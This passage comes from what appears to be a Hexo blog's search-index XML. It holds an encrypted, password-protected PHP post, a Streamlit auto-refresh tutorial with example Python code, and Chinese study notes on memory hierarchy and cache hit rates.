b92da12514587c8710c114de76d44f3d52944a7ce88e9efbb8c38eb425a000c7949521c2ad82d3a44d256d2192c224ab44f620ee772e77855d15ba152c40e7408a637722843bd905ab7d4d081f27486d3f7dc95352b9e66f32861bad1c4094d4a0c0ff9b431182638d8fe7d8577aeb659e805ddd0cb059294a320fd50628080a3009f425949d62e195af686d3cfe8ed84fb9aab1cf3cdaeb113b763b7e473b3953c5b1f2a027e70e822aaff1a61b341d8115dfbb3b9fda658560bbb8d7a8f9dacb2278e6787c9fdb3e5fcb4134c37a9c8b4d5fae3487d8724ac0709048e86a686a572bf49966bb2b1dee24cfdfd68b279bd36353c0201836532126b1daac374e6d29bfe3bdd93fb07d3b718c9d2dd205d3453537a048f729b6c3065949dae7c7a9bf5e38674196f53415981eea4a40166f8480a54f5e1f4d46083c5cc08ed67b69ada63551d780b185ebc3cc3d5904dc60cdfc6967b6268ac0667a89bea57b53f421ec60d96be69b57eefffbe7810a116e90b4c0f966de3377ae028d9d68d4fe9d4654c87e510101c2e5d839a1c923b0e5044946970a2f7e10bab30e5600a7cd12246f44c846fa21bdc9d7fd259a28750e0a37dd5efb9ea8f402bfa8d49b3b5b284c18f9a23f48edde7f25a625cebdbe87b346ceb149557a7a56cb35f2031406a4cc3303671727c33d0f94d3f61d092bebcc618493180ecfd16e97c21138db489be0ac7023f99dbba2913885a18f26b926bbb55c778d235f12b34dc92b12b01029b80941cc5cb1cccb19d2619e059bb306e88fa0b5c0079138ac42178b5885e6fb0bd9aafb5fb0a06137990d75051ec84fa2fca7fb653e002adb2c7b36046cdc189ff49dd972b2458f69054d13b07f77078847784e4a76b998bd81b2992033dc07be95fb040898336da131b15aca95418f7c27088965f6bf6d8a59ee96695494aabaae4cda6bed6176355c8154e6e8b0104b0320720b97f03eaa6faef23af017c0747eb867557faa740cfb0bc0325f9c59bce1cd9c52ffaf00bab223e5899e0dd704539442d10201b993c19010fa2265533abcc61978bf14b3bc9dd1a2882835d6384e416d7ae6076c7b72d8bb0a217a246c4a87f3c32c02b3ad06f218811b01d3f2799169373d1545c0136a696c84760a6a2ad2bf4ba95c1c05723b1286e70963d141a3099ab606284e7566dbcd02e9a9723824248aed180bb78b8d9b9ec01b70cbb57a499a6ccb04a9e1d1c317a6704d38f8f2418334683778238c93b69fa9cb2cf67b455130d6ccfb388feaa99da86189418be31799da0e89c0f7ee100008242aa7147f5acf566b38e17f9e814dcbb264b02de1ddc474d69e972ab3a4d283d5b5e910706c3d42fe2699199327336abe43cf34889feaa45f59a8d9c0099c749769ef5319278162e1ca66d858daa305cb764b9c1b61a794ae91b1ccb753b7a8d223fd87893088f6fbf3af79efe39ed5116673e7fdc976f087badcab6c93c5d9b365b2ad280d43b85cb314febdfec19db5c0c8eba7801a00c7c0690a9c6ac293f150b4c4f9b49a85256a254ca57e8e4ca544a50349388ae603ffcf923d8557f6f3f710a7668176a103f38e35894f1ff1ace4cbd73f97519459aee2e388bc80e59a16e37a84eeebc00c78e3a40baa887d9f39c1e8d757cc5435ea84373b6c464084ff665c53fd31100889e43d56b7204c5ff8419275f01c7651376cfd9ee3b096a15ad8174a5a6578df0804a8dd825e7a68dc5ca5fcc734489535bbeeb07fce2c676e2389a22c44ebfdc334ee967c163965505bf2e6324365b3444ec899997fbfe76f661910e6e88f1671d7ba3185af8dc2383c907a3bdf8f40730ea37abee218a9f8cc1f92c22f2a221a5d9607877387fc7576a1d09ae8066e69b7b5281c1535828409af10808ad842984ac68fc0215ee758f365e96a042481ec7321ee45343e17b4169993a21cac9d267e19d63c93d5daa9d544abbcce4b4bcc3f0bda518bc2686cb60fc53f87cd6625cb3af8808480a641009a1fc63e009798c1824681194ffafa4bd9adc9f3e1dfba20e669ed87d51159cd7d56bdd8b1d2fe9393320aa50104a114eea0d39d3c30a38fbe1e9aeee3601d5b5cb22083f81cc7d7dee6327646cad18f10f25e628a7b90d116fb26c46f01e721c8cbb14f84fbd2e596c748c8ee68d78f6b330183f28bc9843d13217698dc29aac6650b5b61494c3f0dd9b9b949ceb4af6af2b3fd529fa89c4215126824509d93e948e41ae26061aa65ed8f3ebef95b4f4a65b1ff4e33bf97c2e0e359a1add6cab2e5120360e6540ff1ba0af2c347dbc0f96d0ab7f07c5549634484aa11d0887c51fe978e7b0537157648fa009085149b10e769c19bd15e76c17ebf56867602b8800267bd3257d6ed98a82795c7a5c84988500c78a4f4a906ef01eec4a288a2e02c9fa1d4dd80c256d0d889d86c6819045e43a8a6438dbe79756d7a37fde9e34380760aab9641a7219b30cfff99c1ffd908a0445b88ac8ef1760bc66ca1dfd4d4fc971b0cca9606dfdff6cc71c40af6bc8ea1db433b4dc00a8806bbcb9e1ebe95bcd6756997384f895f517b955ceeabebfcb5285fd66509135d163690c6c76ea0f08f40ef69a5814c10576e43c31d349ba75cfb8dc55d7a3391b18697ef60c70bd4c6c44c8ee32209c3953f116a0377e958b8cc65fa6ed2d757013e21cf812d3c95eecc94433bf57d204a41a49f600616dff8069199c901b6d4aff00f0dd73ef9af9389f3cf1976a49eeca84ae00296fad8db3c967875b842255ef0b068daf5d0d0db09177d333026917b741dd8d50207bcb2cd539b9b80fbf43ba4bbe45eafdc732baaa5de1b0dd1e0e470a127ed73b7018bae3e6c1bbefe24ca95fb5fc58b7541f359e1be41922228639caeeed690483f5458955c44e2fc0df100daac868ed6d618d83661a5d08c3a37145be60d1eb9ba4c3184ecf2612ec337bed5723191cf4b1115d0849d0dad014332398d32022b744dc4acbcf0bd1670a0af7fac11a3977872656213564fa18374bec6eb21b406731cd340c373fae727b7d04b26bbcb3ed8b3e33cc959dd0748fdbdecbfe3076aa7a94c96a2d573f41cb6915edc24a22d20369e29cec980f028e5372e55233b2c84d8fa65f56137b9d849eb5cccd7725270a2836ebf354040ed188282e92569b9831e52557961a005bbc461411c3a31262bad80d52cdcea11bf930ec75f2c74b0cf04f7f32b22e08444ed4179d8b6262cea401d7bb15f62a58ef126442ec172e8875007431a077d060142d06580e82b67a14296c2559dae6724e25a2aa0fb74a90f2a73e3d1668f38a61ac8c6ffe7ddab2f0bbc9e4e078d7cc828f6effecfc37b0400f2476d138685447fc28af2c755174e0a6a75018730d69fa072153432ecaddcddb921c5a2f0fec206a361d2e945661b8cff835328597ac21530be2e62c975fa9019931d06c6bc0f1eb08a51242d264771cb2bfe3eb4bf1c8a63b68487d238263bdb8a2b81d7794b75d33294c73dab9d24bacf204ade242c58a3083816bb4af4e4f94888d7f6b2dba1813b404c2ecf6881c79f9229f39fd50a2ac4d8b4a698f1a160dee02f999e0e626bd870aed71154ba4fd5353bc76646044775a3ee847c51b3683845c258de255afff6a2ae246ff98c797621a4f52ec75b1ed9a8fe0bda47bc33dc1e89141ee6b8c56adeec9b409e189afa79d104242243a9fd68a27f530c5de2a2234b4c875839ed027d16a1827c382460c1a0d14531a5d19b54f97757faf1af62059710aa2607de89f3bb9bebd6f498de514b0219aed76a48c46fc0641b02520d1e48a527329595ba514fcf636f1fe6b65dc6765547fad83a82f77b92491834d684ea85f8fd321f1185ac48caf6d7792029e6493aa86a6016c60cdacb40ad819603c7f3fd3b46b12a2d1f2cb01d7fde501da55ee2e52611c39038de5fcb6d84c01bea349c1f9b72e532401152fadd2640bc37bf1c2d7b73d148fab62ccc5016d531f044b91a42bd0c869a02fa5ea75c5feeb56d4e4192ba95a1dac8a99d1683f582baf330637893476aab83741c6e77657404a2e421cc5073db814ac4401621a16ced3431ea0fbff4b13992c829dcd0f3dbd251d521286c59df4ebe5cdebee05d019d3723fb541bbf742fdd31023ef281a73c0e4cb7af9e781241d329fe6d9ff665fb8b9d8762845f6f72d44ae89d3d27b1289ab7a24ea745d0505f27a73c77e09c03c282a9379675b6368445dd2374ff73c49aeff2a458ca29f4eee253c852848b7a2287dc75e4c43d500826ae7968b68773734d40dcbbdf94b79f4250a85db373c4e9eb295dc550f073dc3716e6287ae0cbd69028e43f28e8c88ac0bb7d09670b418d92e098ab737d14574ae4778831cc79326f0c94ec6764ea8cc0accdca23e08b7d0a04b6e33a88c6c836d21d85dc1434c192ed8003566b1344d15805adcfe25090f7c2e847424e509b385ec4ae74d14637aa3282382223a3efa5283f65bf42e5a9b7ec1b8d3ceba44f358a4bce6239309ae5abe5e12dbe25e65ba10064fb298d4e8c3517367f05b556cb2e77afe0f3d4e6bcbf357e94d7fb7cfb37033af3c59e07b5a09c9de787627ffcb54b5301c2e995d75675e1df23b1f1c9f17f5f6a96bedcc7bce025338bc019ec1d99920e5ca851210784813764b1cc7384b2dc1c14624a5dc4bc93c8ff2019dc371d059bf92b25188efedc62e25fd21c268156eab8f0f361c62a6702edec877e46897922b1bb23bed4c4770e1a33bf1bfc104b2ebfa803b5a192819158797c264137a43ac9aa55533c674b249fdcd0867d4c96d71396b8662868a03c145088ba31441904622b419bd3bf4b5ddc3e39d83f4ef3c9b28c3b6d3c36f3764aadef5ac740084ce84595540ae90d2f5c25ce810fcb017f0257fd167204f0ab1153f7cc47044f685f0bccd5710939147b6f31dc7a2372a526566eafcaaccebcb5607d36af0bbf695a43a9bc1580dbe52b527fd31ce0a9d9f9c9595168d3df5e84fde738d5a2f2248b510e1d779b1ccf0ff7e9a5640ef2d88831c459655b3ec9cf29fd2d2c9b618f98683a00a1ef67f3cce3906bef31ace6a1b57a945ed21af13c96dfd81f232258ea517509b14d186fa8ecca81f53437e7e50249f09b6ccd6b4849cf04ca445d284f213fdef395636bbb6baf015901e1e03e69a3db06ca03d78c7ab0256cd9b8e08922a7bf2a70c4c4de266410e8d3b93c71cc326f494a57db2100be7fadf03935df17273f7625e31ebf887ade7d337f8f365449b234c0c337906ea7abe8f77efaf47058b7c423c5364d56f49cec37f8fdf8a69e3ef8636f6b4ded5feea5f13e221b006928610c060461294ba20a4d258136d09fe96de330dd250409f3a20b59cba888ef380a3a54a388808eb769121a988eb629e7599a9bc278f4c87e725540fa722a516c7d1fdd1df3c591a31f04a83bf1ace82e3303f3ebf3a8e4d1430befce584014c36dc734f0641c46bd5a078d109e5b60bc4159f9295b03a00d0fa92af734ffbd3d4d30d1c14412ee5c9e8c1a0c0f308e6d4f08f46d3ce133323c6022034b32f05993ffadc009c5155516e7939d6d8855a3d536674ef0af4d0a2bf44a9bb491c9188dd06bf9a0436315e55c43428882b7164dd213887d73682cf0362bd43ad319a3e28d585d171ce1d4c3cb6ffbec6193b522dabc728e2bfaefd6d53c1bcf9e79c1b14d3206d3e40da7aed1ac2208ad6a51edb0f12021c8bbd65b07fbc6fa4ed584cab32958cbf9a9e3144821c90391e8b2c985ddef11d8d688092292e20962f933ade724e1c2105fc8e601649a1df16ad7304f9926ce48fbb4ec279440459bc7c065c47944cd0fa6f3388dc95acb14af132d115eaeb6fb3c815a60ab930e55997d3d3e322863af16fb5e303d0cb0d9d1891be48c7e9f4afc1af1184c032a9707825fbd8468f51d655de02c04b9dfd325ac29d93cfb42aa0c7cf02f2447e09ffaa05cb0b6ef3bb6f6e135a0188328919dff7816eea8bf3dee6068b957d928d77209adf1cf1cb3b3947de2bbf264acfce0043f755984420f4d158076155084f1df8dbbd9cd9db939dec893f18b77a58c0699dec5144c2535e50ab940800d453c2b36b79f4bba4ece9795789fd2b1fb9fc578903d017708dd12766745705b8840f4f48833cb55bca9ca129414780465386172f9cb03b81f3a2db5b83e238eadd58793c548522f689005d2a94da97ab65228b50a6a342565b3eeea870b3a52a7b1749b8985f3b0c8c8ed108a392d7d7f62a08bfaf5bb1859847b98207a202c5d32c9c153dddebe23be232adca9d941467897b3fbde3f8685ef3e6de57dcad5aa06338fd3e8c2b0be5a070872adb373ff5cb287ddb8edb206a9c3a103c3d52a0056ee3abe0ab4da5edc24b79490807877e33c233bdb0b2f60f616cefc9189f0d6b69ce3363c4da17a34229d162892b30eccc9f2f5c496ed9df7ea6cfdc6087aac7e6fdc4dd1edac525531b11306c716ac54a1e9a0964cc572a401d0b274486bc6dc9457b3d70344d6ed299fd4c94b0fae6796631107893aeaf93cdfc29729e627f140ac832ae54b92ac64473d88b0474aa1e4acd2295cc1d5d18c29b7d9427a6371e5957188257e455772bbdff54f8142160f40b5562ad99f7980cd46a369e02367a667c774a38dd4cc4e7b7f50b8e82ce66e9ececef4a6e7ce7b56d48ad6833d438f941a6fa386815acac0fafb6c1c2563b924659296bd30625cf6a4ba41a32b176eeffbe43abcaffe24a33d453d5d98d69375e33cc86da3e984e08a1ba484a374bb3b5fce0840557105e3a1cee9c233c56256a93de3532013bb5076e8af7e06b2e422866d7f09c0bb459e1d69b09385599fa7b3e8fe12ae12dbf20453b0f64f818c7ee82241e3fe0196933c00a4a658897bd941cd3746a440b172464e8d82d9da9fdb30739256f808794592394ced75ed4c0e98206e5faba903661db4e81e70e0fc89e9abb2396f46fa01afb81aa77ef9da6fd58910a13424cb35cab02b32215606c298cdff718a126c8d0f9cd83344631a73d02f621da23c4b170ecd3a52d95a8a0fa87d26033310c6e89fd1fbcee773a08450fae01c6940d9167c195c437b72164be675afaefc3d4a579dfdc713825214e3538dcb4de1ba168d67a2d5d057f87f808e96799b6f7859b59311b27b173f2b50a8e5ee33914087ae4ff1b2f44ed620688aa5fae2d68339922563289cc694b8c3aa22782ce095dbdae099b857e8c8e34c4d03db8b2e45469f721f0f62574ab8034858cb7f55b935db42f940fc7ea25d4e40812d16cf2bbedb6c0686f629ac9bbdc715d03067dc39ae9e30ce85a4265042b31ddfe9990c7806aff586edb2d405884b69c4d176317311ecf42c4c011feabeb47fbe4da0ffe968188b7d7600ea788386d12943d995eb0dda9c274257e16ee70c3ba0633890dc6947a0ffc256d96e9b4ccb39dbe6307ceb576ddff487ea3db8d729a62d7fe83d606009ca5456b9b58dbbde90532189fc06d1bd6026ffd5ad3ea26da7a1d53741dbc2a523cf48f44b2f401cc916c4692207e2fe6666d0dd5bc62a7a210caf716512578715a43b01313c5abfb920914662f98486453723fc90ce4ecb541e4a2275112894daf47718597566989c0737b4ebf8c92ea70feb3a6e32376182a0ea2b703fd570862379571e83c42f2d526f782f871024dc701808f53c959b97a56b4f18dc1f4384eea74878d38dc9480d8ab42b828ffc55c92e350e9bf1e20efa7f8da8ab2d9c6d210f0a4f5ae9b37ad52c1925beb566aff3df4b8d0bff34f6a272bf5b197d583e053a3487fdab5df7ca78a9fcd01cfa0a190bb72c1416f94ce5cbc818ab07dc858ca10b1dc70a179e61b700fcfebc2ea9032fdeb5959fbb6687839d8cf0ccbd6ff18a117a26255aaff5cb18faaf313ec0258129b6b7dfd90c3b62f8e99e6a77c572b2407cdef1f7e4f31c37b6824f102c65f7628d66b4a266b862123216b478271f9de51e4735c8ad22e16c792d1a74c543360248e90c9df98e3d6fe407e5a3c6e7ea1e857fa0d6dde09554f23dfd8051807d0b62b84d683fa7a23c18d6435c5812552914dc45877eab5e20c82453cd9745c56ef6b81106a2daec9289595f9c582d6f03385bc53cb3338deb79404cc86541cb9c1313e11db129b0c8a3466218c6a616f3b647b4afdbba20068a694dbab4755e21eff293099961fe95151be7a97fb4a6801ae2308ff572c27890fb0b384216d685e93368ff7b3bde656b07a2f138d2d5cdf76d3beb61c5c7b8f635532b9f9874f8765f255cb7afb8c937963e54791e028934849410c71be06b0c3714136ab4e8b879f35b0b97034ce359bc64241005ee37fb92289d0627d4c6857362aac3df37f2a3af7d3f4ecf8e310d8e8771c9e2709e6d6fe06e83cbc548ff79b998df0e0b0d0f24a5e2f3ca105d5c1827b31ff616fe963bc64438101e3718deb9b4be8388e9e2a708dd2c18a8e7b7a7976d6270fa09c4cdf82517a6b867eb82838f1b5bd8e9664529e5f4dcc19f056d8f0a2a368e3f482864db60a9ef47b1eb0d2903bd73cee4fb3371c633016e83ebd164d0e49a7e8148b2a97f9fafe94e1707d8c052ddcaabd439f9f1d7948540f6082cbdc5c56b677723f3daa8718719fbc01cf46e60e28546da060e5ae6ed2814cb8f2bf501467629423b637126cc4dd5339550422372be9b05ba56cae74b2058e1e83190b5400604842374e6099df0fe9c0ca44df642a29bf4310e0b5cddbc17d2afb48709c7bacc5240681f611b43fa52c2e8d3a7a852136bc3509fc4010dade7e3fc24ede36f3694d05444ea16d8eaf502d356f91d902dd811c4f977b07f7bcd52443eeab6898d4191126e6b9433b3cd2133593a7660118a3719dd1db3af290f0ecda7a6cc957a35a8f97778b38a75da673d825198fbb0b039be2135bbc9ef1a9656efe8d16e36a2b1097555b650a6d63e38e7a470a8d687c0739225a04b06267f3f1ba03629440e95027feca6c68219f0821ac2f4ffa1026655e6250dc54fe73443e8d05e0ad21268bc90956eba434a00e7b15f8103633be56c48f9b661896a057567ff1398670cb70b5c7c6b0082797e0045c4ce2224089e9e08aa4f4905e655f9dc95e913783890962c8906cd39cd80c1d42321f5a1b8b6934adf7cad9e26a455f803e343eebb190f623a7da24aba3dd4b5517d60d5821d2bd9928b2ebb4d84d574021a9319ff451d7ee8ce6f3ea308eac9493d00f37a71c315fe683b6b042d7af91e179f02c042a5e7692b1143769182f7158bdb00548eb17af05c352972aea9c3e3373b54e5f8aec82f6996e6899b6573abfd1e9b90ddcb3537f15a5c6db2a5ea17db92df5184cf615800fcb4679d7458d09a40c0cf788e913e314baa008c17e595232032cd2b149f097790ab7102948dae8bb6b3083681bcafd589d1f5552eaa948ca6c48b55578e77b7d79dc0bbd3b5eaf7094457db5aae5a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>streamlit动态刷新</title>
      <link href="/2024/04/27/"/>
      <url>/2024/04/27/</url>
      
        <content type="html"><![CDATA[<h1 id="Streamlit库的动态刷新效果"><a href="#Streamlit库的动态刷新效果" class="headerlink" title="Streamlit库的动态刷新效果"></a>Streamlit库的动态刷新效果</h1><p>最近做项目用streamlit做demo，感觉研究出了新用法</p><p>大多数的st项目都是静态的，即使有组件可以给你搭建监控栏。</p><p>研究出来了一个可以动态刷新后台数据的方法</p><blockquote><p>其实不能和真的刷新效果媲美，但是可以当做下位替代</p><p>并且应该也有人想到了，只是社区内容真心不多</p></blockquote><p>下代码是一个最小用例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> streamlit <span class="keyword">as</span> st</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;count&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> st.session_state:<span class="comment">#初始化一个计数器</span></span><br><span class="line">  st.session_state.count=<span class="number">0</span></span><br><span class="line">temp=st.session_state.count</span><br><span class="line">st.session_state.count+=random.random()%<span class="number">1</span> <span class="comment">#随机+0-1</span></span><br><span class="line">st.metric(label=<span class="string">&quot;计数&quot;</span>, value=st.session_state.count,delta=<span class="built_in">round</span>(st.session_state.count-temp,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">if</span> st.session_state.count&gt;=<span class="number">10</span>:</span><br><span class="line">  st.error(<span class="string">&#x27;计数达到10，程序结束&#x27;</span>)</span><br><span class="line">  st.stop()</span><br><span class="line">time.sleep(<span class="number">1</span>) <span class="comment">#每秒刷新一次</span></span><br><span class="line"></span><br><span class="line">st.rerun()</span><br></pre></td></tr></table></figure><p>这个方法有个问题，比如你在页面上显示的东西从后端数据库中消失了（因为你的操作）</p><p>那么会留下容器残留(你可能看见的形式就是容器变灰了)</p><p>有个解决办法：</p><p>新建一个空白页blank.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> streamlit <span class="keyword">as</span> st</span><br><span class="line"><span class="comment">#这是什么页面？</span></span><br><span class="line"><span class="comment">#天才的想法，由于st有缓存，删除的评论会留下一个容器未被装填，而重新加载一下这个页面没作用</span></span><br><span class="line"><span class="comment">#把这个页面作为跳转页面，根本看不出来是两个页面hhh</span></span><br><span class="line">st.switch_page(<span class="string">f&quot;./pages/<span class="subst">&#123;st.session_state.previouspage&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>比如你上一个页面是example.py</p><p>则在跳转前利用st.session_state.previouspage记录下当前页面example.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">st.session_state.previouspage=<span class="string">&#x27;example.py&#x27;</span></span><br><span class="line">st.switch_page(<span class="string">&#x27;./pages/blank.py&#x27;</span>)</span><br></pre></td></tr></table></figure><p>看到的效果是：</p><ol><li>页面操作后容器灰了一下</li><li>跳转到了一个白页面</li><li>马上又显示了原本的页面，且没有原本的容器残留</li></ol><blockquote><p>跳转速度是很快的</p></blockquote><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>现在在研究直接插入的html元素能否与后端交互。</p><p>目前的查询表示是不行的，即使有按钮，该按钮也不能和python的后端</p><p>st_tweaker这个库可以算是解决了这一痛点，可以写css了</p><p>后续看看能不能js交互</p><p>或者发现一个组件竟然能够<strong>监控点击状态</strong></p><p>有研究的也可以给我发发邮件<strong>QAQ</strong></p>]]></content>
      
      
      <categories>
          
          <category> Streamlit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂谈2</title>
      <link href="/2024/04/22/"/>
      <url>/2024/04/22/</url>
      
        <content type="html"><![CDATA[<p>好久没更新了，准备更新中..</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【计算机组成原理】存储器</title>
      <link href="/2024/03/26/"/>
      <url>/2024/03/26/</url>
      
        <content type="html"><![CDATA[<h1 id="存储器的分类与性能评价"><a href="#存储器的分类与性能评价" class="headerlink" title="存储器的分类与性能评价"></a>存储器的分类与性能评价</h1><h2 id="存储器的分类"><a href="#存储器的分类" class="headerlink" title="存储器的分类"></a>存储器的分类</h2><p>按存储介质分类：</p><ol><li>半导体存储器</li><li>磁表面存储器</li><li>磁芯存储器</li><li>光盘存储器</li></ol><p>按存取时间是否相等分类：</p><ol><li>存取时间与物理地址无关（随机访问） 随机存储器和只读存储器</li><li>存取时间与物理地址有关（串行访问） 顺序存取存储器和直接存取存储器</li></ol><p>按处理器是否直接访问：分为主存和辅存</p><p>按掉电后信息是否丢失：分为易失性存储器和非易失性存储器</p><p>按访问方式的不同，可分为：</p><ol><li>按地址访问的存储器</li><li>按内容访问的存储器CAM（相联存储器）</li><li>指定位置访问的存储器（堆栈）</li></ol><p>按在计算机中的作用分类：</p><script type="math/tex; mode=display">存储器\begin{cases}RAM\begin{cases}静态RAM\\动态RAM\\\end{cases}\\ROM\begin{cases}MROM\\PROM\\EPROM\\EEPROM\end{cases}\\Flash\space Memory\\高速缓冲存储器(Cache)\\辅助存储器 磁盘、磁带、光盘\end{cases}</script><h2 id="存储器的性能评价"><a href="#存储器的性能评价" class="headerlink" title="存储器的性能评价"></a>存储器的性能评价</h2><p><strong>存储容量</strong>：存放二进制信息的数量</p><p>存储容量=存储单元个数*存储字长（按字）=字节数（按字节编址）</p><p>目前计算机存储容量大多以字节数表示</p><p><strong>存取速度</strong>：一般采用两种参数描述</p><ol><li>存取时间$（T_A）$指从CPU给出有效地址启动一次存取（读/写）操作到该操作完成所需的时间。读写分别为$T_{AR}、T_{AW}$</li><li>存取周期$(T_{mc})$指连续两次存储器操作之间的最小时间，间隔略大于$T_A$</li></ol><p><strong>带宽</strong>：每秒从存储器进出的最大信息量</p><p>存取周期反映了存储器的带宽</p><p>提高带宽途径：</p><ol><li>缩短存取周期（制造工艺方面）</li><li>增加存储字长</li><li>增加存储体</li></ol><p><strong>成本</strong>：价格，有两个指标，存储系统总的拥有成本和每存储位的成本</p><h1 id="存储系统的层次结构"><a href="#存储系统的层次结构" class="headerlink" title="存储系统的层次结构"></a>存储系统的层次结构</h1><h2 id="存储器访问的局部性原理"><a href="#存储器访问的局部性原理" class="headerlink" title="存储器访问的局部性原理"></a>存储器访问的局部性原理</h2><p>经过对处理器访问主存储器情况的统计发现，无论是取指令还是存取数据，处理器访问的存储单元趋向于聚集在一个相对较小的连续存储单元区域内。这种现象称为存储器访问的局部性原理。       </p><p><strong>访问局部性表现为时间局部性和空间局部性。</strong>       </p><p><strong>时间局部性</strong>是指将要访问的信息就是现在正在访问的信息。      </p><p><strong>空间局部性</strong>是指将要用到的信息就在正使用的信息旁边。</p><h2 id="层次结构的存储系统"><a href="#层次结构的存储系统" class="headerlink" title="层次结构的存储系统"></a>层次结构的存储系统</h2><p>用户对存储系统的要求一般是相同的：<strong>容量大、速度快、价格低</strong>。       在现有存储器工艺技术水平下，上述要求<strong>无法满足</strong>。容量大的存储器在速度上通常要比容量小的存储器慢。速度快的存储器在价格上通常要比速度慢的存储器贵。       </p><p> 为了解决这种问题，选用生产与运行成本不同的、存储容量不同的、读写速度不同的多种存储介质，按一定的层次结构组织成一个统一的存储器系统，使每种介质都处于不同的地位，发挥不同的作用，充分发挥各自在速度、容量、成本方面的优势，从而综合达到最优性能价格比，即把这样一个存储器组织<strong>作为一个整体看，具有容量大、速度快、位价低的综合指标</strong>。这样一个存储整体称为“存储系统”。  </p><p>存储器三个主要特性的关系：（速度、容量、价格）</p><p><img src="/2024/03/26/存储特性.png" alt="三个特性"></p><ol><li>通用寄存器组处于CPU内部、为执行指令方便而设。<strong>速度最快、容量最小、位价最高</strong></li><li>主存：是存储系统的核心，是计算机自动、高速运行程序必不可少的功能部件、是计算机传统的五大部件之一。因此，计算机对主存的要求是比较高的，但在目前的存储技术水平下，<strong>主存只能做到容量比较大、速度比较快、位价适中</strong>，<strong>仍然远远满足不了CPU运行程序的要求。</strong></li><li>高速缓存Cache：为平滑主存与CPU之间的速度之差，加速CPU访存的速度，在性能较好的计算机中，主存与CPU之间增加一个缓冲存储器，<strong>其容量比通用寄存器组大得多，比主存小得多，速度接近CPU，位价介于寄存器与主存之间</strong>。<strong>Cache与主存一起构成内存。</strong></li></ol><p>寄存器、Cache、主存由不同指标的半导体存储器实现</p><ol><li>辅助存储器（外部存储器）：为存放大量备用的程序和数据，在主机之外设置了一级辅助存储器，其<strong>容量比主存大得多，速度比主存慢得多，但位价也便宜得多</strong>。       辅存通常由磁表面存储器实现，目前大多数计算机使用磁盘，但由于磁盘的容量实际上也有限，因此有些系统使用磁带等速度更低、容量更大（磁带等设备带盘可换，容量可无限延伸）的磁表面存储器作为硬盘的后备。       由于辅存与主机的连接方式和I/O设备相同，因此主机通常以I/O管理方式管理外存。</li></ol><h2 id="缓存—主存层次和主存—辅存层次"><a href="#缓存—主存层次和主存—辅存层次" class="headerlink" title="缓存—主存层次和主存—辅存层次"></a>缓存—主存层次和主存—辅存层次</h2><p><img src="/2024/03/26/层次.png" alt="层次"></p><ol><li>Cache—主存层次：根据程序运行的局部性原理，可以在计算机运行程序时，通过合理的调度将当前使用最多的一小段程序和数据放在Cache中，使 CPU大部分时间访问高速缓存Cache，只有个别的指令或数据从缓存中读不到，需要到主存去取。这样，从整体运行的效果分析，CPU访存速度接近于Cache的速度，而寻址空间和位价却接近于主存。</li><li>主存—辅存层次：为了更好地对主存、辅存统一调度，目前广泛采用虚拟存储技术，即将主存与辅存的一部份通过软硬结合的技术组成虚拟存储器，程序员可使用这个比主存实际空间大得多的虚拟地址空间编程，当程序运行时，再由软、硬件自动完成虚拟地址空间与主存实际物理空间的转换。这个转换操作对于程序员来说是透明的。因此，从程序员的角度看，他所使用的存储器其容量和位价接近于辅存，而速度接近于主存。</li></ol><h2 id="命中率"><a href="#命中率" class="headerlink" title="命中率"></a>命中率</h2><blockquote><p>若要访问的信息在高一级存储器中找到，则称为命中，否则称为不命中或失效。</p></blockquote><p>若要访问的信息在高一级存储器中找到，则称为命中，否则称为不命中或失效。</p><p>设第1级和第2级存储器分别用M1和M2表示。设执行一组有代表性的程序后，测得对M1和M2访问的次数分别为R1和R2，则M1的命中率H为      </p><script type="math/tex; mode=display">H=\frac{R_1}{R_1+R_2}</script><p>整个存储层次的平均访存周期$T_c$与$M_1$和$M_2$的访存周期$T_{c1}$和$T_{c2}$的关系为：</p><script type="math/tex; mode=display">T_c=H\times T_{c1}+(1-H)\times T_{c2}</script><p>层次结构存储系统的平均字节价格C为：</p><script type="math/tex; mode=display">C=(C_1 \times S_1+C_2 \times S_2)/(S_1+S_2)</script><p>式中，$C_1$和$S_1$分别为$M_1$的单位字节价格和容量，$C_2$ $S_2$分别为$M_2$的单位字节价格和容量。</p><p>各级存储器存放的信息必须能够满足两个基本原则:</p><ol><li>一致性原则：同一个信息在各级存储器中必须保持相同的值</li><li>包含性原则：处在内层（更靠近CPU）存储器中的信息一定包含在各外层的存储器中</li></ol><h1 id="半导体存储器"><a href="#半导体存储器" class="headerlink" title="半导体存储器"></a>半导体存储器</h1><p>根据存储的信息是否可以读/写，半导体存储器分为随机访问半导体存储器（RAM）和只读半导体存储器（ROM）</p><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p><img src="/2024/03/26/半导体存储器基本结构.png" alt="半导体存储器基本结构"></p><h2 id="半导体存储芯片的译码驱动方式"><a href="#半导体存储芯片的译码驱动方式" class="headerlink" title="半导体存储芯片的译码驱动方式"></a>半导体存储芯片的译码驱动方式</h2><h3 id="单译码方式（线选法）"><a href="#单译码方式（线选法）" class="headerlink" title="单译码方式（线选法）"></a>单译码方式（线选法）</h3><p><img src="/2024/03/26/线选法.png" 